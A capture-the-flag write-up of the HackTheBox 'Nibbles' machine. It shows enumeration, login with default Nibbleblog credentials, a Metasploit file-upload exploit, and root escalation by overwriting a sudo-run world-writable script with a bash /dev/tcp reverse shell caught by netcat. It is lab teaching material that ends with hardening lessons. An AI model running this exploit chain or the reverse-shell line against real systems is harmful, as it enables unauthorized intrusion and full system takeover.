---
title: HTB Nibbles Writeup
date: 2026-08-17 14:00:00 +0400
categories: [HTB, Easy]
tags: [nibbleblog, file-upload, rce, privilege-escalation, sudo]
---

# HTB Nibbles — Writeup

**Machine**: Nibbles | **OS**: Linux | **Difficulty**: Easy | **IP**: 10.129.65.25

---

## Machine Information

- **Operating System**: Linux
- **Web Application**: Nibbleblog v4.0.3 (2014)
- **Primary Ports**: 22 (SSH), 80 (HTTP)

---

## Reconnaissance & Enumeration

### Nmap Scan

Started with a basic port scan to identify running services:

```bash
nmap -sC -sV 10.129.65.25
```

**Open Ports:**
- **Port 22**: OpenSSH
- **Port 80**: HTTP Web Server

### Web Application Discovery

Accessed the web server on port 80 and examined the page source. The page source revealed a hidden directory:

/nibbleblog


### Directory Enumeration

Used gobuster to find additional directories:

```bash
gobuster dir -u http://10.129.65.25 -w wordlist.txt
```

**Discovered Paths:**
- `/nibbleblog` — Main blog application
- `/nibbleblog/content` — Content directory
- `/nibbleblog/admin.php` — Administrative panel
- `/nibbleblog/README` — Version and documentation

### Version Discovery

Accessed the README file and found:

Nibbleblog v4.0.3
Released: 2014


Nibbleblog 4.0.3 is extremely old with known file upload vulnerabilities.

### Default Credentials Discovery

Researched default credentials for Nibbleblog:

Username: admin
Password: nibbles


Attempted login to `/nibbleblog/admin.php` — successful!

---

## Exploitation

### Stage 1: File Upload Vulnerability

Nibbleblog 4.0.3 has a known file upload vulnerability in the admin panel that allows uploading arbitrary files including PHP code.

### Stage 2: Setting Up Metasploit Exploit

Used Metasploit's Nibbleblog exploit:

```bash
msfconsole
use multi/http/nibbleblog_file_upload
set RHOSTS 10.129.65.25
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog
set LHOST 10.10.14.60
run
```

**Result:**

Meterpreter session opened
Shell obtained as user: nibbler


### Stage 3: Obtaining Initial Shell

```bash
shell
id
```

**Output:**

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)


Successfully obtained shell as nibbler user.

---

## Privilege Escalation

### Stage 1: Sudo Enumeration

Checked sudo permissions:

```bash
sudo -l
```

**Critical Finding:**

User nibbler may run the following commands on Nibbles:
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


### Stage 2: Script Analysis

Checked script permissions:

```bash
ls -l /home/nibbler/personal/stuff/monitor.sh
```

**Output:**

-rwxrwxrwx 1 nibbler nibbler 1234 monitor.sh


The script is world-writable! Anyone can modify it.

### Stage 3: Overwriting the Script

Created a new version with reverse shell:

```bash
cat > /home/nibbler/personal/stuff/monitor.sh << 'EOF'
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.60/9001 0>&1
EOF
```

### Stage 4: Verifying the Script

Validated syntax:

```bash
bash -n /home/nibbler/personal/stuff/monitor.sh
```

No errors returned.

### Stage 5: Setting Up Listener

```bash
nc -lvnp 9001
```

### Stage 6: Executing as Root

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Result:** Root shell received on listener!

```bash
id
```

**Output:**

uid=0(root) gid=0(root) groups=0(root)


---

## Post-Exploitation: Flag Capture

### User Flag

```bash
cat /home/nibbler/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Summary & Key Takeaways

### Attack Chain

1. Web enumeration found hidden `/nibbleblog` directory
2. Version discovery revealed Nibbleblog v4.0.3 (2014)
3. Default credentials admin:nibbles worked
4. File upload RCE via Metasploit exploit
5. Initial shell as nibbler user
6. Sudo enumeration found root-executable script
7. Script was world-writable
8. Overwrote script with reverse shell
9. Root access achieved

### Key Vulnerabilities

- Outdated Nibbleblog v4.0.3 with known vulnerabilities
- Default credentials not changed
- File upload RCE in admin panel
- Weak sudo configuration (NOPASSWD)
- World-writable script despite root execution
- No input validation on script

### Tools Used

- `nmap` — port scanning
- `gobuster` — directory enumeration
- `msfconsole` — Metasploit framework
- `nc (netcat)` — reverse shell listener
- Standard Linux commands

### Lessons Learned

- Always inspect page source for hidden directories
- README files leak version information
- Try default credentials
- sudo -l is critical after gaining shell
- World-writable files + sudo = instant root
- Validate scripts with bash -n before running
- Disable NOPASSWD in sudo rules
- Restrict permissions on root-executable scripts

---

## Flags

- 🚩 **User Flag**: Captured from `/home/nibbler/user.txt`
- 🚩 **Root Flag**: Captured from `/root/root.txt`

**Machine: Completed ✓**
